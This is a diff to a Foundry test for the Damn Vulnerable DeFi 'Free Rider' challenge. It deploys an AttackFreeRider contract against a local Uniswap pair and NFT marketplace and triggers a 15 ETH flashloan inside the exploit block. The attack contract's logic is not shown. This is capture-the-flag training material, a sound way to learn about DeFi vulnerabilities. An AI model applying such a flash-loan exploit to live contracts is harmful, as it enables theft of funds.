@@ -9,6 +9,8 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {AttackFreeRider} from "../../../src/Contracts/attack/AttackFreeRider.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -35,6 +37,8 @@ contract FreeRider is Test {
     address payable internal buyer;
     address payable internal attacker;
     address payable internal deployer;
+
+    using Address for address;
 
     function setUp() public {
         /**
@@ -134,9 +138,24 @@ contract FreeRider is Test {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker, attacker);
+
+        console.log("attacker address:", address(attacker));
+        console.log("freeRiderBuyer address:", address(freeRiderBuyer));
+        console.log("freeRiderNFTMarketplace address:", address(freeRiderNFTMarketplace));
+        console.log("buyer address:", address(buyer));
+        console.log("weth address:", address(weth));
+
+        vm.startPrank(attacker);
+
+        AttackFreeRider attackContract = new AttackFreeRider(attacker, address(damnValuableNFT), 
+        address(uniswapV2Router), address(uniswapV2Pair), payable(freeRiderNFTMarketplace), address(freeRiderBuyer), payable(weth));
+
+        attackContract.flashloan(address(weth), 15 ether);
 
         vm.stopPrank();
+
+        console.log("buyer balance:", damnValuableNFT.balanceOf(address(freeRiderBuyer)));
+
         /**
          * EXPLOIT END *
          */
